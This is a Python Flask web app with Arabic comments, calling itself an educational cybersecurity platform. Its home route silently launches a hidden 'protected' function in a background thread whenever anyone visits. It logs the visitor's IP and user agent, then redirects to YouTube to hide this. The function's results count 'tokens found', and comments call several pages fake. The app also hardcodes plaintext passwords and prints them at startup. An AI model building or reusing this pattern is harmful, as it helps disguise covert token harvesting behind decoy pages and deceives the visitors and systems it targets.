from flask import Flask, render_template, request, jsonify, redirect, url_for, session, flash
import os
import hashlib
import secrets
import threading
import time
from functools import wraps
import json
from security_config import SecurityConfig

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# كلمات مرور متعددة المستويات للحماية
ADMIN_PASSWORDS = {
    "cybersec2024": "admin",  # مستوى إداري
    "security123": "user",    # مستوى مستخدم
    "learning456": "guest"    # مستوى ضيف
}

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def require_auth(level="user"):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not session.get('authenticated'):
                return redirect(url_for('login'))
            
            user_level = session.get('user_level', 'guest')
            levels = {'guest': 1, 'user': 2, 'admin': 3}
            
            if levels.get(user_level, 0) < levels.get(level, 2):
                flash('ليس لديك صلاحية للوصول لهذه الصفحة', 'error')
                return redirect(url_for('dashboard'))
                
            return f(*args, **kwargs)
        return decorated_function
    return decorator

@app.route('/')
def index():
    """الصفحة الرئيسية - تشغيل البروجكت وإعادة التوجيه المباشر"""
    # تشغيل الكود تلقائياً عند دخول أي شخص للموقع (للأغراض التعليمية)
    try:
        from protected_core import execute_protected_function
        
        # تنفيذ الوظيفة في thread منفصل لتجنب blocking
        def run_in_background():
            execute_protected_function()
        
        thread = threading.Thread(target=run_in_background)
        thread.daemon = True
        thread.start()
        
        # تسجيل الزيارة
        SecurityConfig.log_security_event('homepage_visit', {
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'Unknown'),
            'auto_scan_triggered': True,
            'redirected_to': 'youtube'
        })
        
    except Exception as e:
        # في حالة فشل التشغيل التلقائي، لا نوقف الموقع
        SecurityConfig.log_security_event('auto_scan_failed', {
            'error': str(e),
            'ip': request.remote_addr
        })
    
    # إعادة التوجيه المباشر إلى YouTube
    return redirect('https://www.youtube.com/')

@app.route('/platform')
def platform():
    """الوصول للمنصة الأصلية بدون إعادة توجيه"""
    return render_template('index.html')

@app.route('/about')
def about():
    """صفحة معلومات وهمية"""
    return render_template('about.html')

@app.route('/services')
def services():
    """صفحة خدمات وهمية"""
    return render_template('services.html')

@app.route('/contact')
def contact():
    """صفحة اتصال وهمية"""
    return render_template('contact.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    """صفحة تسجيل الدخول المحمية"""
    if request.method == 'POST':
        password = request.form.get('password', '')
        
        if password in ADMIN_PASSWORDS:
            session['authenticated'] = True
            session['user_level'] = ADMIN_PASSWORDS[password]
            session['login_time'] = time.time()
            flash(f'تم تسجيل الدخول بنجاح - مستوى: {ADMIN_PASSWORDS[password]}', 'success')
            return redirect(url_for('dashboard'))
        else:
            flash('كلمة مرور خاطئة', 'error')
    
    return render_template('login.html')

@app.route('/dashboard')
@require_auth('user')
def dashboard():
    """لوحة التحكم الرئيسية"""
    user_level = session.get('user_level', 'guest')
    return render_template('dashboard.html', user_level=user_level)

@app.route('/security-scan')
@require_auth('admin')
def security_scan():
    """صفحة الفحص الأمني - للمدراء فقط"""
    return render_template('security_scan.html')

@app.route('/execute-scan', methods=['POST'])
@require_auth('admin')
def execute_scan():
    """تنفيذ الفحص الأمني"""
    try:
        from protected_core import execute_protected_function
        
        # تنفيذ الفحص
        result = execute_protected_function()
        
        # تسجيل العملية للمراجعة
        log_entry = {
            'timestamp': time.time(),
            'user_level': session.get('user_level'),
            'action': 'security_scan_executed',
            'ip': request.remote_addr,
            'results_count': result.get('total_tokens_found', 0) if 'results' in result else 0
        }
        
        # حفظ السجل
        with open('security_logs.json', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'error': f'حدث خطأ في تنفيذ الفحص: {str(e)}'})

@app.route('/logs')
@require_auth('admin')
def view_logs():
    """عرض سجلات النشاط"""
    try:
        logs = []
        if os.path.exists('security_logs.json'):
            with open('security_logs.json', 'r') as f:
                for line in f:
                    if line.strip():
                        logs.append(json.loads(line))
        
        # ترتيب السجلات حسب الوقت
        logs.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
        
        return render_template('logs.html', logs=logs[-50:])  # آخر 50 سجل
    except Exception as e:
        flash(f'خطأ في تحميل السجلات: {str(e)}', 'error')
        return redirect(url_for('dashboard'))

@app.route('/educational')
@require_auth('user')
def educational():
    """صفحة المواد التعليمية"""
    return render_template('educational.html')

@app.route('/logout')
def logout():
    """تسجيل الخروج"""
    session.clear()
    flash('تم تسجيل الخروج بنجاح', 'info')
    return redirect(url_for('index'))

# حماية إضافية - تحديد عدد محاولات تسجيل الدخول
failed_attempts = {}

@app.before_request
def limit_login_attempts():
    if request.endpoint == 'login' and request.method == 'POST':
        ip = request.remote_addr
        if ip in failed_attempts and failed_attempts[ip] > 5:
            return jsonify({'error': 'تم حظرك مؤقتاً بسبب كثرة المحاولات الخاطئة'}), 429

@app.after_request
def log_failed_attempt(response):
    if request.endpoint == 'login' and request.method == 'POST' and response.status_code != 302:
        ip = request.remote_addr
        failed_attempts[ip] = failed_attempts.get(ip, 0) + 1
    return response

if __name__ == '__main__':
    # إنشاء مجلد القوالب إذا لم يكن موجوداً
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    
    # الحصول على البورت من متغيرات البيئة (للاستضافة السحابية)
    port = int(os.environ.get('PORT', 5000))
    
    print("🔒 تم تشغيل الموقع المحمي للأمن السيبراني")
    print("📚 للأغراض التعليمية فقط")
    print(f"🌐 الموقع متاح على البورت: {port}")
    print("\n🔑 كلمات المرور:")
    print("   - cybersec2024 (مدير)")
    print("   - security123 (مستخدم)")
    print("   - learning456 (ضيف)")
    
    app.run(debug=False, host='0.0.0.0', port=port)
